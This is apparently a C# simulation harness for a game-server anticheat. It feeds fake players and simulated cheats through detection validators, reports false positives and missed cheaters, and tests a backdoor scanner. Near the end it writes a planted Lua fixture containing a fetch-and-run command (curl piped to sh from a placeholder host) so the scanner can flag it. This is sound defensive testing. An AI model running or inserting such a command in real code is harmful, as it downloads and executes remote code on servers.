using System.Diagnostics;
using JcksAnticheat.Core.Backdoor;
using JcksAnticheat.Core.Bans;
using JcksAnticheat.Core.Config;
using JcksAnticheat.Core.Dashboard;
using JcksAnticheat.Core.Detection;
using JcksAnticheat.Core.Json;
using JcksAnticheat.Core.Validation;

var repo = FindRepo();
var resource = Path.Combine(repo, "resource", "jcks_anticheat");
var cfg = AnticheatConfig.ParseValidated(File.ReadAllText(Path.Combine(resource, "config.json")));
var ledger = new ViolationLedger(cfg.Scoring);
var bans = new BanStore(Path.Combine(Path.GetTempPath(), "jac-sim-bans-" + Guid.NewGuid().ToString("N") + ".json"));
var url = Environment.GetEnvironmentVariable("JCKS_AC_DASHBOARD_URL");
var secret = Environment.GetEnvironmentVariable("JCKS_AC_DASHBOARD_SECRET");
DashboardBridge? bridge = string.IsNullOrEmpty(url) || string.IsNullOrEmpty(secret) ? null
    : new DashboardBridge(new DashboardConfig { Enabled = true, Url = url!, ServerId = "main" }, secret: secret);

var players = new Dictionary<int, (string name, List<string> ids, bool online)>();
int nextId = 1;
int AddPlayer(string name)
{
    int id = nextId++;
    players[id] = (name, new List<string> { $"license:{Guid.NewGuid():N}", $"discord:{100000000000 + id * 7919}", $"token:3:{Guid.NewGuid():N}" }, true);
    return id;
}

var banned = new HashSet<int>();
var throttle = new JcksAnticheat.Core.Logging.ReportThrottle();
var rows = new List<(string scenario, string player, string layer, string codes, string action)>();
var now = DateTime.UtcNow;

void Handle(string scenario, int id, IEnumerable<Violation> violations, string layer)
{
    var list = violations.ToList();
    var actions = new List<string>();
    foreach (var v in list)
    {
        ledger.Record(v, now);
        now = now.AddMilliseconds(100);
        actions.Add(v.Action.ToString().ToLowerInvariant());
        if (throttle.ShouldReport(v, now, out var repeats)) bridge?.Enqueue("detection", new Dictionary<string, object?>
        {
            ["player"] = v.Player, ["name"] = players[v.Player].name, ["code"] = v.Code, ["source"] = v.Source.ToString().ToLowerInvariant(),
            ["severity"] = v.Severity, ["score"] = Math.Round(v.ScoreAfter, 1), ["action"] = v.Action.ToString().ToLowerInvariant(),
            ["evidence"] = repeats > 0 ? new Dictionary<string, object?>(v.Evidence) { ["repeats"] = repeats } : v.Evidence, ["bypass"] = false, ["dryRun"] = false,
        });
        if (v.Action == EnforcementAction.Ban && banned.Add(v.Player))
        {
            var ban = bans.Add(new Ban { Name = players[v.Player].name, Identifiers = players[v.Player].ids, Reason = "Automated: " + v.Code, Code = v.Code });
            bridge?.Enqueue("ban", ban);
            players[v.Player] = (players[v.Player].name, players[v.Player].ids, false);
        }
        else if (v.Action == EnforcementAction.Kick) players[v.Player] = (players[v.Player].name, players[v.Player].ids, false);
    }
    var worst = list.Count == 0 ? "-" : list.Select(v => v.Action).Max().ToString().ToLowerInvariant();
    rows.Add((scenario, players[id].name, layer, list.Count == 0 ? "none" : string.Join(",", list.Select(v => v.Code).Distinct()), worst));
    now = now.AddSeconds(3);
}

var clean = AddPlayer("Mara");
var cleanDriver = AddPlayer("Theo");
var movement = new MovementValidator(new MovementLimits());
var damage = new DamageValidator(cfg.Damage);
var explosions = new ExplosionValidator(cfg.Explosions);
var entities = new EntityValidator(cfg.Entities);
var flags = new PlayerFlagsValidator { MaxHealth = cfg.MaxHealth, ExpectedDamageModifier = cfg.ExpectedDamageModifier };
var massKills = new MassKillTracker(cfg.Damage);
var gameEvents = new GameEventValidator(cfg.GameEvents, () => Array.Empty<uint>());

var walk = new List<Violation>();
for (int i = 0; i < 10; i++)
    walk.AddRange(movement.Evaluate(clean, new MovementSample(new Vec3(100 + i * 5, 200, 30), new Vec3(5, 0, 0), MovementMode.OnFoot, now.AddSeconds(i))));
for (int i = 0; i < 10; i++) walk.AddRange(flags.Evaluate(clean, new PlayerFlags(false, 1, 1, 1, 1, 200, false, false, false, false)));
Handle("clean player walking", clean, walk, "server");

var drive = new List<Violation>();
for (int i = 0; i < 10; i++)
    drive.AddRange(movement.Evaluate(cleanDriver, new MovementSample(new Vec3(500 + i * 40, 0, 30), new Vec3(40, 0, 0), MovementMode.LandVehicle, now.AddSeconds(i))));
Handle("clean player driving 40 m/s", cleanDriver, drive, "server");

var tp = AddPlayer("dumper_77");
var tpV = movement.Evaluate(tp, new MovementSample(new Vec3(0, 0, 30), default, MovementMode.OnFoot, now));
tpV.AddRange(movement.Evaluate(tp, new MovementSample(new Vec3(2500, 1800, 40), default, MovementMode.OnFoot, now.AddSeconds(1))));
Handle("teleport 3 km in 1 s", tp, tpV, "server");

var sj = AddPlayer("frog_legs");
Handle("super jump (sync flag)", sj, flags.Evaluate(sj, new PlayerFlags(true, 1, 1, 1, 1, 200, false, false, false, false)), "server");

var dm = AddPlayer("one_tap");
var dmV = flags.Evaluate(dm, new PlayerFlags(false, 4f, 4f, 1, 1, 200, false, false, false, false));
var pistol = WeaponCatalog.All.First(w => w.Name == "WEAPON_PISTOL");
dmV.AddRange(damage.Evaluate(new WeaponHit { Attacker = dm, VictimPlayer = clean, WeaponHash = pistol.Hash, Damage = pistol.BaseDamage * 6, AttackerPos = new Vec3(0, 0, 30), VictimPos = new Vec3(10, 0, 30), AttackerHeading = 270, At = now }));
Handle("damage multiplier x4 + oversized hit", dm, dmV, "server");

var semi = AddPlayer("tank_mode");
Handle("semi-godmode (defense 0.1)", semi, flags.Evaluate(semi, new PlayerFlags(false, 1, 1, 0.1f, 1, 200, false, false, false, false)), "server");

var ex = AddPlayer("boomer");
var exV = new List<Violation>();
for (int i = 0; i < 8; i++)
    exV.AddRange(explosions.Evaluate(new ExplosionInfo { Source = ex, OwnerPlayer = ex, ExplosionType = i % 2 == 0 ? 2 : 29, DamageScale = 1, Position = new Vec3(i, 0, 30), At = now.AddMilliseconds(i * 100) }).violations);
Handle("explosion spam + blacklisted type", ex, exV, "server");

var spawner = AddPlayer("car_rain");
var spV = new List<Violation>();
for (int i = 0; i < 20; i++) spV.AddRange(entities.Evaluate(spawner, 0x2B26F456u, EntityKind.Vehicle, true, now.AddMilliseconds(i * 200)).violations);
var unknown = EntityScriptCheck.Evaluate(spawner, true, false, null, 0x2B26F456u, EntityKind.Vehicle);
if (unknown != null) spV.Add(unknown);
Handle("vehicle spawn flood from unknown script", spawner, spV, "server");

var troll = AddPlayer("cage_master");
var att = new List<Attachment> { new Attachment(9001, troll, clean), new Attachment(9002, troll, cleanDriver), new Attachment(9003, troll, clean) };
Handle("props attached to other players", troll, AttachmentWatch.Evaluate(att, cfg.Entities.MaxAttachedToOthers).violations, "server");

var killer = AddPlayer("kill_all");
var kV = new List<Violation>();
for (int i = 0; i < 9; i++) { var v = massKills.RecordKill(killer, 100 + i, 0u, now.AddMilliseconds(i * 300)); if (v != null) kV.Add(v); }
Handle("mass kill (9 players in 3 s)", killer, kV, "server");

var proj = AddPlayer("rpg_rain");
var pV = new List<Violation>();
for (int i = 0; i < 25; i++) pV.AddRange(gameEvents.Projectile(new ProjectileInfo { Source = proj, WeaponHash = 0xB1CA77B1u, Origin = new Vec3(400, 400, 60), ShooterPos = new Vec3(0, 0, 30), At = now.AddMilliseconds(i * 100) }).violations);
Handle("projectiles from 560 m away, spammed", proj, pV, "server");

var ext = AddPlayer("money_glitch");
Handle("server script report (bank exploit)", ext, new[] { ExternalReport.Create(ext, "money_exploit", "my_bank", new Dictionary<string, object?> { ["amount"] = 2500000 }, now)! }, "export");

var lua = new[] { "lua5.4", "lua" }.SelectMany(n => (Environment.GetEnvironmentVariable("PATH") ?? "").Split(':').Select(p => Path.Combine(p, n))).FirstOrDefault(File.Exists);
if (lua != null)
{
    var clientCheats = new (string scenario, string name)[]
    {
        ("godmode", "immortal"), ("invisible", "ghost_rider"), ("noclip", "wallwalker"), ("give_all_weapons", "arsenal"),
        ("top_speed", "rocket_car"), ("injected_resource", "menu_user"), ("thermal", "x_ray"), ("vehicle_repair", "fixer"),
    };
    foreach (var (scenario, name) in clientCheats)
    {
        var id = AddPlayer(name);
        var psi = new ProcessStartInfo(lua) { RedirectStandardOutput = true };
        psi.ArgumentList.Add(Path.Combine(repo, "tools", "sim", "client_sim.lua"));
        psi.ArgumentList.Add(resource);
        psi.ArgumentList.Add(scenario);
        using var p = Process.Start(psi)!;
        var line = p.StandardOutput.ReadToEnd().Trim();
        p.WaitForExit();
        var parts = line.Split('\t');
        var codes = parts.Length > 2 && parts[2] != "none" ? parts[2].Split(',') : Array.Empty<string>();
        var undone = parts.Length > 3 ? parts[3] : "-";
        var violations = codes.Select(c => new Violation(id, c, ViolationSource.Client, new Dictionary<string, object?> { ["scenario"] = scenario, ["undone"] = undone })).ToList();
        if (scenario == "godmode") violations.Add(new Violation(id, "PLY_GODMODE_FLAG", ViolationSource.Server, new Dictionary<string, object?> { ["serverObserved"] = true }));
        Handle("client: " + parts.ElementAtOrDefault(1), id, violations, "client" + (undone == "yes" ? ", undone" : ""));
    }
}

Console.WriteLine($"{"Scenario",-44} {"Player",-14} {"Layer",-16} {"Detected",-58} Outcome");
Console.WriteLine(new string('-', 150));
foreach (var r in rows) Console.WriteLine($"{Trim(r.scenario, 44),-44} {r.player,-14} {r.layer,-16} {Trim(r.codes, 58),-58} {r.action}");
int falsePositives = rows.Count(r => r.player is "Mara" or "Theo" && r.codes != "none");
int missed = rows.Count(r => r.player is not ("Mara" or "Theo") && r.codes == "none");
Console.WriteLine();
Console.WriteLine($"clean players flagged: {falsePositives}, cheaters missed: {missed}, bans: {bans.All.Count}");

var fixture = Path.Combine(Path.GetTempPath(), "jac-sim-res-" + Guid.NewGuid().ToString("N"));
Directory.CreateDirectory(Path.Combine(fixture, "server"));
File.WriteAllText(Path.Combine(fixture, "server", "main.lua"), "local shop = {}\nRegisterNetEvent('shop:buy')\nos.execute('curl -s http://example.invalid/x | sh')\n");
var findings = BackdoorScanner.ScanResource("free_car_shop", fixture, new ScanOptions());
Directory.Delete(fixture, true);
Console.WriteLine($"backdoor scan of a planted test resource: {findings.Count} finding(s): " + string.Join(", ", findings.Select(f => $"{f.Rule} {f.File}:{f.Line}")));

if (bridge != null)
{
    bridge.Enqueue("settings", new Dictionary<string, object?> { ["config"] = cfg.ToJson(), ["schema"] = MiniJson.Parse(File.ReadAllText(Path.Combine(resource, "settings.schema.json"))) });
    bridge.Enqueue("backdoor_scan", findings.Select(f => (object?)new Dictionary<string, object?>
    {
        ["id"] = f.Id, ["resource"] = f.Resource, ["file"] = f.File, ["line"] = f.Line, ["rule"] = f.Rule,
        ["severity"] = f.Severity.ToString().ToLowerInvariant(), ["description"] = f.Description, ["snippet"] = f.Snippet,
    }).ToList());
    bridge.Enqueue("players", players.Select(p => (object?)new Dictionary<string, object?>
    {
        ["id"] = p.Key, ["name"] = p.Value.name, ["identifiers"] = p.Value.ids, ["ping"] = 30 + p.Key * 3,
        ["score"] = Math.Round(ledger.ScoreOf(p.Key, now), 1),
        ["heartbeat"] = new Dictionary<string, object?> { ["seq"] = 40 + p.Key, ["lastValidAt"] = DateTime.UtcNow.ToString("o"), ["failures"] = 0 },
    }).ToList());
    await bridge.FlushAsync();
    var offline = players.Where(p => !p.Value.online).Select(p => p.Key).ToList();
    bridge.Enqueue("players", players.Where(p => p.Value.online).Select(p => (object?)new Dictionary<string, object?>
    {
        ["id"] = p.Key, ["name"] = p.Value.name, ["identifiers"] = p.Value.ids, ["ping"] = 30 + p.Key * 3,
        ["score"] = Math.Round(ledger.ScoreOf(p.Key, now), 1),
        ["heartbeat"] = new Dictionary<string, object?> { ["seq"] = 40 + p.Key, ["lastValidAt"] = DateTime.UtcNow.ToString("o"), ["failures"] = 0 },
    }).ToList());
    await bridge.FlushAsync();
    Console.WriteLine("pushed to dashboard: " + (bridge.LastError ?? "ok") + $" ({offline.Count} players kicked/banned)");
}
return falsePositives == 0 && missed == 0 && findings.Count > 0 ? 0 : 1;

static string Trim(string s, int n) => s.Length <= n ? s : s.Substring(0, n - 1) + "…";

static string FindRepo()
{
    var dir = new DirectoryInfo(AppContext.BaseDirectory);
    while (dir != null && !Directory.Exists(Path.Combine(dir.FullName, "resource", "jcks_anticheat"))) dir = dir.Parent;
    return dir?.FullName ?? throw new InvalidOperationException("repo not found");
}
